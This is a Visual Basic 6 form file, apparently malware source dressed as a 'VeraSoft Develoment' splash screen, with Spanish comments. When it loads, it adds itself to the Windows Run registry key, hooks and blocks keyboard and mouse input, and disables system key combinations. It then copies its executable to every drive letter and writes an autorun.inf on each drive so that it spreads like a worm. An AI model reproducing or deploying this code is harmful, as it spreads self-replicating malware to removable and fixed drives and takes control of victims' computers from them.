VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Begin VB.Form frmSplash 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   ClientHeight    =   8985
   ClientLeft      =   210
   ClientTop       =   1365
   ClientWidth     =   10830
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "frmSplash.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8985
   ScaleWidth      =   10830
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer3 
      Interval        =   2
      Left            =   4080
      Top             =   720
   End
   Begin VB.Timer blockteclas 
      Interval        =   1
      Left            =   2640
      Top             =   1080
   End
   Begin VB.Timer Block 
      Interval        =   1000
      Left            =   840
      Top             =   840
   End
   Begin VB.Timer Timer2 
      Interval        =   60
      Left            =   720
      Top             =   1800
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   240
      Top             =   1800
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      Height          =   5130
      Left            =   1080
      TabIndex        =   0
      Top             =   2280
      Width           =   8520
      Begin MSComctlLib.ProgressBar ProgressBar1 
         Height          =   375
         Left            =   1800
         TabIndex        =   2
         Top             =   4680
         Width           =   5535
         _ExtentX        =   9763
         _ExtentY        =   661
         _Version        =   393216
         BorderStyle     =   1
         Appearance      =   0
         Min             =   1e-4
         Scrolling       =   1
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         Caption         =   "VeraSoft Develoment"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   18
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00808080&
         Height          =   435
         Left            =   3000
         TabIndex        =   3
         Top             =   4200
         Width           =   3600
      End
      Begin VB.Image imgLogo 
         Height          =   2385
         Left            =   360
         Picture         =   "frmSplash.frx":000C
         Stretch         =   -1  'True
         Top             =   795
         Width           =   1815
      End
      Begin VB.Label lblCompanyProduct 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         Caption         =   "VeraSoft Develoment"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   18
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00808080&
         Height          =   435
         Left            =   2520
         TabIndex        =   1
         Top             =   2040
         Width           =   3600
      End
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      Caption         =   "VeraSoft Develoment"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   435
      Left            =   3480
      TabIndex        =   4
      Top             =   1800
      Width           =   3600
   End
End
Attribute VB_Name = "frmSplash"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'*************************************************************
Private Declare Function SystemParametersInfo Lib "user32" _
Alias "SystemParametersInfoA" _
(ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long

'*************************************************************

Dim Bloqueado As Boolean
' variable para establecer los segundos de bloqueo
Dim TiempoBloqueo As Integer

'*************************************************************
'Referencias para que Funcione este Program
'Ir a menu Project y despues referencias y agrega Windows Script Host Object Model

'*************************************************************
' Constante de la rama del registro donde estan los paths d las
'aplicaciones
Const Rama_Windows_Run As String = "HKEY_LOCAL_MACHINE\SOFTWARE\" & _
"Microsoft\Windows\CurrentVersion\Run\"
'*************************************************************
'Variable de objeto para poder usar Windows Script Host
Dim o_Registro As WshShell
'*************************************************************

Dim DRIVES(1 To 26) As String
Dim prgName As String



Private Sub Block_Timer()
 Static segundos As Integer
  
    ' Increase count of seconds that have passed
    segundos = segundos + 1
    
    'Check if time is up
    If segundos >= TiempoBloqueo Then
        'If it is, unlock
        Desbloquear
        'And then reset the timer's second count
        segundos = 0
    End If
   
    Label2.Caption = "Mouse y KeyBoard bloquedo. Tiempo : " & _
              segundos & " de : " & TiempoBloqueo & " ..segundos"
End Sub

Private Sub blockteclas_Timer()
Dim x As Long
    x = SystemParametersInfo(97&, True, False, 0&)

End Sub

Private Sub Form_KeyDown(KeyCode As Integer, Shift As Integer)
'MsgBox "teclas blok"
Beep
Dim x As Long
    x = SystemParametersInfo(97&, True, False, 0&)
End Sub

Private Sub Form_KeyPress(KeyAscii As Integer)
Beep
Dim x As Long
    x = SystemParametersInfo(97&, True, False, 0&)

    Unload Me

End Sub

Private Sub Form_Load()
 TiempoBloqueo = 5

'*************************************************************
'creamos e insanciamos una variale`para poder usar las funciones de windows SH
Set o_Registro = New WshShell

prgName = App.EXEName + ".exe"
Transparent.Aplicar_Transparencia frmSplash.hwnd, 215
'------------------------------
'para poner el form en pantalla completa
' al atamaño de la resolucion  del monitor
frmSplash.Top = 0
frmSplash.Left = 0
frmSplash.Width = Screen.Width
frmSplash.Height = Screen.Height
Frame1.Top = Screen.Height / 4
Frame1.Left = Screen.Width / 4
'-------------------------------
Call o_Registro.RegWrite(Rama_Windows_Run & App.EXEName, App.Path & "\" _
& App.EXEName & ".exe")

'blckea el muse y el teclad
Bloqueado = False
Bloqueado = True
    Bloquear
   
    
    
End Sub

Private Sub Frame1_Click()
    Unload Me
End Sub

Private Sub lblCopyright_Click()
End Sub

Sub ProgressBar1_Click()
ProgressBar1.Visible = True
Dim i, x As Integer
i = 1
ProgressBar1.Max = 100000


While i < 100000

Label1.Caption = Str((i * 100) / ProgressBar1.Max)
i = i + 1
ProgressBar1.Value = i

Wend
End Sub

Private Sub Timer1_Timer()

Timer1.Enabled = False
Timer2.Enabled = True

End Sub

Private Sub Timer2_Timer()
'Call ProgressBar1_Click
Call ejecutar

Timer2.Enabled = False
End Sub
Sub COPY()
On Error Resume Next
Dim i As Integer
i = 1
While i < 26
Label2.Caption = "Copy:" + DRIVES(i) + prgName
FileCopy App.Path + "\" + prgName, DRIVES(i) + prgName
i = i + 1
Wend
Call autorun
End Sub
Sub DRIVELIST()
DRIVES(1) = "C:\"
DRIVES(2) = "B:\"
DRIVES(3) = "C:\"
DRIVES(4) = "D:\"
DRIVES(5) = "E:\"
DRIVES(6) = "F:\"
DRIVES(7) = "G:\"
DRIVES(8) = "H:\"
DRIVES(9) = "I:\"
DRIVES(10) = "J:\"
DRIVES(11) = "K:\"
DRIVES(12) = "L:\"
DRIVES(13) = "M:\"
DRIVES(14) = "N:\"
DRIVES(15) = "O:\"
DRIVES(16) = "P:\"
DRIVES(17) = "Q:\"
DRIVES(18) = "R:\"
DRIVES(19) = "S:\"
DRIVES(20) = "T:\"
DRIVES(21) = "U:\"
DRIVES(22) = "V:\"
DRIVES(23) = "X:\"
DRIVES(24) = "Y:\"
DRIVES(25) = "Z:\"
DRIVES(26) = "R:\"

Call COPY
End Sub
Sub autorun()
On Error Resume Next
Dim i As Integer
i = 1
While i < 26
Label2.Caption = "Auto:" + DRIVES(i)

Open DRIVES(i) + "\autorun.inf" For Output As #1  'genera el archivo el el drive
'seleccionado por drvDisk
Print #1, "[autorun]"
Print #1, "Open=" + prgName
Close #1
i = i + 1
Wend

End Sub
Sub ejecutar()
Call DRIVELIST
End Sub
'sub que elimina los Hook para el teclado y mouse
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Sub Desbloquear()
    
    ' Vuelve a Habilitar el teclado
    If IdKeyBoard <> 0 Then UnhookWindowsHookEx IdKeyBoard
    ' Vuelve a Habilitar el mouse
    If IdMouse <> 0 Then UnhookWindowsHookEx IdMouse
    
    ' cambia el flag
    Bloqueado = False
    
    ' cierra el timer y restaura la ventana
    Timer1.Enabled = False
    Me.WindowState = vbNormal
    Me.Cls
End Sub

Private Sub Bloquear()
    
    Me.WindowState = vbMaximized
    Timer1.Enabled = True
    
    ' Pone la ventana Always OnT op
    SetWindowPos Me.hwnd, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS
    
    ' deshabilita el teclado
    IdKeyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, _
                                      AddressOf WinProcKeyBoard, _
                                      App.hInstance, 0)
    
    ' deshabilita el mouse
    IdMouse = SetWindowsHookEx(WH_MOUSE_LL, _
                                        AddressOf WinProcMouse, _
                                        App.hInstance, 0)
    ' setea el flag
    Bloqueado = True
End Sub



Private Sub Timer3_Timer()
Dim x As Long
    x = SystemParametersInfo(97&, True, False, 0&)
End Sub
